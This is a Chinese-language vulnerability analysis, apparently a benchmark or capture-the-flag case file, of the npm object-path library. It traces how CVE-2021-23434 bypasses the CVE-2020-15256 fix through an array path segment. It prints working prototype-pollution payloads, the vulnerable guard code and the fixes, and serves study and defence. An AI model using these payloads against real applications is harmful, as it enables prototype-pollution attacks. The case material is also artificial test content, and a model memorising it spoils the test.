# object-path：`=== '__proto__'` 只认字符串，数组键被 `obj[key]` 再转回原型

- Case：`PCBV2-0157`
- 产品：npm `object-path`（按路径深 get/set）。写的是**已发布包 API** `objectPath.withInheritedProps.set(obj, path, value)`；本平台用 HTTP harness 驱动该 API，包体来自 `object-path@0.11.5`，不是抽文件拼包。
- 链：CVE-2020-15256 / GHSA（0.11.4 → 0.11.5，commit `2be3354` / `8e77521`）→ CVE-2021-23434 / SNYK-JS-OBJECTPATH-1569453（0.11.5 → 0.11.6，commit `43af2d8` / `7bdf4ab`）
- NVD 对 CVE-2021-23434 的原话：*A type confusion vulnerability can lead to a bypass of CVE-2020-15256 when the path components used in the path parameter are arrays. In particular, the condition `currentPath === '__proto__'` returns false if currentPath is `['__proto__']`.*

根因不只是「漏了一种 path 写法」。检查插在「当前这一段是不是字符串 `'__proto__'`」上；真正写属性的是后面的 `obj[currentPath] = value`。JavaScript 的 `===` 不跨类型；属性键会 `ToString`。下面按调用走进去。

---

## 这块功能本来在干什么

`object-path` 把 `"a.b.c"` 或 `['a','b','c']` 走成嵌套赋值。`withInheritedProps` 实例打开 `includeInheritedProps: true`：沿途不但看 ownProperty，还看继承属性。一次典型调用：

```js
const objectPath = require('object-path').withInheritedProps
objectPath.set({}, ['user', 'role'], 'admin')
```

`set` 取出 `path[0]`，用 `getShallowProperty` 读当前层，然后要么在叶子赋值，要么递归进 `obj[currentPath]`。设计意图：调用者只能在传入的那个对象树上建中间节点、写叶子。成功穿越之后的效果是：**走的过程中踏到 `Object.prototype`，叶子写在共享原型上**。本 case 的金丝雀闸门读的是「一个全新的 `{}` 是否继承到 `pcbUnlock`」——只有原型被加上这个键才会放行。

数据流：

```text
withInheritedProps.set(target, path, 'unlocked')
    → set()
         currentPath = path[0]
         V1：if (includeInheritedProps && currentPath === '__proto__') throw
         getShallowProperty(obj, currentPath)   // includeInherited 时恒为 true，返回 obj[prop]
         叶子：obj[currentPath] = value         ← ToString(key) 后写槽
         非叶子：set(obj[currentPath], path.slice(1), ...)
    → 新 {} 继承到 pcbUnlock → 闸门放出 PCBFLAG_...
```

CVE 文本写明：默认实例（`includeInheritedProps: false`）在 ≥0.11.0 上不受影响；必须用 `withInheritedProps` 或显式 `create({includeInheritedProps:true})`。守卫本身也 gated 在这个 flag 上。

---

## 原始漏洞：路径段直接当属性名（CVE-2020-15256，0.11.4）

0.11.4 的 `set()` 在取出 `currentPath` 之后**没有**魔法属性判断，直接 `getShallowProperty` + `obj[currentPath]`。`includeInheritedProps` 时 `hasShallowProperty` 恒真，所以 `__proto__` 会沿着原型链解引用：

```js
// object-path@0.11.4  set()  无守卫
var currentPath = path[0]
var currentValue = getShallowProperty(obj, currentPath)
if (path.length === 1) {
  obj[currentPath] = value   // currentPath === '__proto__' → 写到 Object.prototype
}
```

seed：

```js
objectPath.withInheritedProps.set({}, ['__proto__', 'pcbUnlock'], 'unlocked')
```

第一段字符串 `'__proto__'` 让 walk 踏到 `Object.prototype`，第二段把 `pcbUnlock` 写上去。闸门看到新 `{}` 继承到该键，放出 flag。这就是 v0 + `--seed`。NVD：*limited to the `includeInheritedProps` mode*。

---

## 维护者改了什么（CVE-2020-15256 修复，0.11.5）

0.11.5（jsDelivr `object-path@0.11.5` / tag 对应 `index.js`）在赋值**之前**加了严格相等：

```js
# V0  0.11.4
var currentPath = path[0]
var currentValue = getShallowProperty(obj, currentPath)

# V1  0.11.5   （本 case 的目标）
var currentPath = path[0]
var currentValue = getShallowProperty(obj, currentPath)
if (options.includeInheritedProps && (currentPath === '__proto__' ||
    (currentPath === 'constructor' && typeof currentValue === 'function'))) {
  throw new Error('For security reasons, object\'s magic properties cannot be set')
}

# V2  0.11.6
var currentPath = path[0]
if (typeof currentPath !== 'string' && typeof currentPath !== 'number') {
  currentPath = String(currentPath)
}
var currentValue = getShallowProperty(obj, currentPath)
# 然后同一段 === 守卫
```

对 seed `['__proto__','pcbUnlock']`：`currentPath` 是字符串，`=== '__proto__'` 为真，throw，不写原型。这就是 v1 + `--seed` 退出码 10。

补丁默认了两件事：

1. 危险键是字符串 `'__proto__'` 或（constructor 且当前值是 function）。
2. 拿去比较的 `currentPath` 和拿去当属性名的 `currentPath` 是同一套相等关系。

第二点不成立：`===` 要求类型相同；`obj[key]` 会把非字符串键 `ToString`。更关键的是：守卫**之后**仍用同一个 `currentPath` 去做 `obj[currentPath]`，中间没有第二次「这个键规范化后是不是 `__proto__`」。

---

## 消毒之后，这个键怎么接到赋值上

V1 守卫一过，同一个 `set` 立刻：

```js
if (path.length === 1) {
  if (currentValue === void 0 || !doNotReplace) {
    obj[currentPath] = value
  }
  return currentValue
}
if (currentValue === void 0) {
  obj[currentPath] = (typeof path[1] === 'number') ? [] : {}
}
return set(obj[currentPath], path.slice(1), value, doNotReplace)
```

inherited 模式下的浅读是：

```js
if (options.includeInheritedProps) {
  hasShallowProperty = function () { return true }
}
function getShallowProperty(obj, prop) {
  if (hasShallowProperty(obj, prop)) {
    return obj[prop]
  }
}
```

`hasShallowProperty` 恒真，所以不会在「不是 own key」时停住。属性访问的 ToString：

```text
['__proto__'].toString() === '__proto__'
obj[['__proto__']]  ≡  obj['__proto__']
```

ECMAScript `ToPropertyKey` 对对象键调用 `ToString`；Array 的 `toString` 是 `join(',')`，单元素数组就等于那个元素的字符串。过滤器刚看过的是 `currentPath === '__proto__'`（false，因为左边是 Array）；赋值看到的是字符串键 `'__proto__'`。两套语义中间没有 `String(currentPath)`。

Snyk PoC 写成 `[['proto'], 'polluted']` 再读全局 `polluted`，依赖的是同一 ToString；CVE 正文用带下划线的 `'__proto__'`。本 case residual `[['__proto__'], 'pcbUnlock']` 与 NVD 描述一致。

叶子写在 `Object.prototype` 上。闸门用另一个全新对象读继承属性。金丝雀出现在 HTTP 响应里，依据是这次**全局原型被加上键**，而不是 target 自己的 ownProperty。harness 每次探测后 `delete Object.prototype.pcbUnlock`，避免串扰。

---

## 仓库里已经有更强的检查，守卫没用上

同一文件里已经有按类型处理键的函数：

```js
function getKey(key){
  var intKey = parseInt(key)
  if (intKey.toString() === key) {
    return intKey
  }
  return key
}
```

`get` / `has` / `del` 会 `getKey(path[0])`；**`set` 对 `currentPath` 不做 `getKey`，也不做 `String()`**。`getKey` 只把纯数字字符串收成 int，并不把 Array 收成 `'__proto__'`，所以即便 `set` 调用了它也挡不住这条残余——真正缺的是守卫前的 `String()`。

默认实例的 `hasShallowProperty` 用 `Object.prototype.hasOwnProperty.call`，`obj['__proto__']` 在默认模式下常常根本走不到继承写（0.11.0+ 的默认 `set` 对 `__proto__` 的行为与 inherited 不同）。V1 选择在 inherited 模式上加字符串黑名单，而不是：

- 先 `String(currentPath)` 再比较（V2 的做法），或
- 对 inherited 模式也只用 ownProperty 写（默认实例已经如此）。

不是没有更好的谓词，是 **set 的守卫用了最窄的 `===` 字符串比较**。Snyk PoC 把数组段写成 `[['proto'], 'polluted']` 再依赖 ToString；CVE 正文用的是 `['__proto__']`。

---

## 这个补丁挡住了什么、没挡住什么

- 守卫：`currentPath === '__proto__'`（类型+值）
- 赋值：`obj[currentPath]`（ToString 后的属性名）

只要构造一种输入，使「严格相等」为假、但 `ToString(currentPath)` 仍是 `__proto__`，第一行放行，第二行仍踏到原型。

```js
objectPath.withInheritedProps.set({}, [['__proto__'], 'pcbUnlock'], 'unlocked')
```

```text
path[0] = ['__proto__']          // Array
['__proto__'] === '__proto__'    // false → 不 throw
obj[['__proto__']]               // 键变成 '__proto__'
                                 // walk 踏到 Object.prototype
path[1] = 'pcbUnlock'            // 叶子写在原型上
```

NVD / Snyk 把这叫做类型混淆：*`===` returns always false when the type of the operands is different*。

字符串 seed `['__proto__','pcbUnlock']` 被挡住，只说明「字符串这一形态没了」，不说明「不能再通过 set() 污染原型」。

---

## 残余仍然走同一条 set() 赋值（CVE-2021-23434）

没有换 API、没有换 `withInheritedProps`、没有换叶子键名。还是：

```js
withInheritedProps.set({}, [['__proto__'], 'pcbUnlock'], 'unlocked')
```

V1 那一行 `===` 照样执行；执行完 `currentPath` 仍是数组；`obj[currentPath]` 把 walk 送上 `Object.prototype`；叶子写出 `pcbUnlock`；闸门放行。公开 residual 与 seed 是同一 sink（`set` 的叶子赋值），只换了第一段的 JS 类型。

平台 harness 的 `/probe?spec=` 只是把 JSON path 交给这份 API。library CVE 的产品面就是 `withInheritedProps.set`。

---

## 后来又补了什么（CVE-2021-23434，0.11.6）

在守卫**之前**强制把非 string/number 的段变成字符串：

```js
if (typeof currentPath !== 'string' && typeof currentPath !== 'number') {
  currentPath = String(currentPath)
}
```

`String(['__proto__']) === '__proto__'`，随后 `===` 命中，throw。公开建议是升级到 0.11.6。Snyk：*Upgrade object-path to version 0.11.6 or higher.*

即便如此，守卫仍只拦 `__proto__` 和 `constructor`+function，仍 gated 在 `includeInheritedProps`。对这条数组键 residual 它够用。`prototype` 段或更深层 `constructor.prototype` 需要另证。

---

## 从这条链还能看出什么

**维护者改错了哪一层。**  
他们改的是「当前段是不是这个字符串」。真正进原型的是 `obj[key]` 的 ToString。V2 仍在比较层加码（先 String()），没有改成「只写 ownProperty」或 `Object.create(null)` 目标。

**不是没有更好的谓词。**  
默认实例已经用 `hasOwnProperty` 避免继承 walk。`getKey` 已经在别的方法里规范化键。从 0.11.5 的 diff 只能看到加了 `=== '__proto__'`；要判断是否闭合，必须看到 `obj[currentPath]` 对 Array 键做什么。

**同一 `set()`、同一 `$currentPath`，只换了段的 JS 类型。**  
任何把用户数组交给 `withInheritedProps.set` 的调用方，在 0.11.5 上都吃这一行守卫和同一次赋值。

**闸门读的是继承，不是 own。**  
金丝雀不在 `target.pcbUnlock`。能读到它，说明写落到了 `Object.prototype`。

---

## 版本、入口、参考

| | npm | `set()` 守卫 | 叶子赋值 | 字符串 `__proto__` seed | 数组 `['__proto__']` residual |
|---|---|---|---|---|---|
| V0 | 0.11.4 | 无 | `obj[currentPath]=` | 污染，读到金丝雀 | （不必） |
| V1 | 0.11.5 | `=== '__proto__'`，无强制 String | 同上 | throw | 污染，读到金丝雀 |
| V2 | 0.11.6 | 先 `String(currentPath)` 再 `===` | 同上 | throw | throw |

- API：`require('object-path').withInheritedProps.set(obj, path, value)`
- V1 blob：https://cdn.jsdelivr.net/npm/object-path@0.11.5/index.js （`set` 内守卫，约取 `path[0]` 处）
- [CVE-2020-15256](https://nvd.nist.gov/vuln/detail/CVE-2020-15256)、[CVE-2021-23434](https://nvd.nist.gov/vuln/detail/CVE-2021-23434)
- [Snyk SNYK-JS-OBJECTPATH-1569453](https://snyk.io/vuln/SNYK-JS-OBJECTPATH-1569453)
- 修复提交：[2be3354](https://github.com/mariocasciaro/object-path/commit/2be3354c6)（15256）、[7bdf4ab](https://github.com/mariocasciaro/object-path/commit/7bdf4abefd102d16c163d633e8994ef154cab9eb)（23434）
